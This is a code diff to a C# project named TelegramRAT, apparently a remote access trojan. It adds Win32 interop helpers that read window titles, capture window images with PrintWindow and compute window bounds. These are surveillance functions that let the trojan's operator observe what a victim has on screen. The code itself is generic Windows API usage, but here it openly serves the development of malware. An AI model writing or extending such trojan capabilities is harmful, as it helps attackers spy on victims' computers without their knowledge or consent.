@@ -105,6 +105,53 @@ namespace TelegramRAT
 
         [DllImport(u32, EntryPoint = "PostMessageA")]
         public static extern bool PostMessage(IntPtr hWnd, int msg, int wParam, int lParam);
+
+
+        [DllImport("user32.dll", EntryPoint = "SendMessage", CharSet = CharSet.Auto)]
+        public static extern bool SendMessage(IntPtr hWnd, uint Msg, int wParam, StringBuilder lParam);
+
+        [DllImport("user32.dll")]
+        public static extern IntPtr SendMessage(int hWnd, int Msg, int wparam, int lparam);
+
+        const int WM_GETTEXT = 0x000D;
+        const int WM_GETTEXTLENGTH = 0x000E;
+
+        public static string GetWindowTitle(IntPtr hWnd)
+        {
+            int titleSize = SendMessage((int)hWnd, WM_GETTEXTLENGTH, 0, 0).ToInt32();
+
+            if (titleSize == 0)
+                return String.Empty;
+
+            StringBuilder title = new StringBuilder(titleSize + 1);
+
+            SendMessage(hWnd, (int)WM_GETTEXT, title.Capacity, title);
+
+            return title.ToString();
+        }
+
+        [DllImport(u32, EntryPoint = "PrintWindow")]
+        public static extern bool PrintWindow(IntPtr hWnd, IntPtr hDcBlt, uint flags);
+
+        [DllImport(u32, EntryPoint = "GetWindowRect")]
+
+        static extern bool GetWindowRect(IntPtr hWnd, IntPtr Rect);
+        [DllImport(u32, EntryPoint = "GetWindowRect")]
+        static extern unsafe bool GetWindowRect(IntPtr hWnd, Rectangle* Rect);
+
         
+        public static unsafe Rectangle GetWindowBounds(IntPtr hWnd)
+        {
+            Rectangle rect = new Rectangle();
+            Rectangle* ptr = &rect;
+            //IntPtr rectHandle = IntPtr.Zero;
+            //Marshal.StructureToPtr(rect, rectHandle, true);
+            GetWindowRect(hWnd, ptr);
+            rect.Width -= rect.X;
+            rect.Height -= rect.Y;
+            return rect;
+        }
+
+
     }
 }
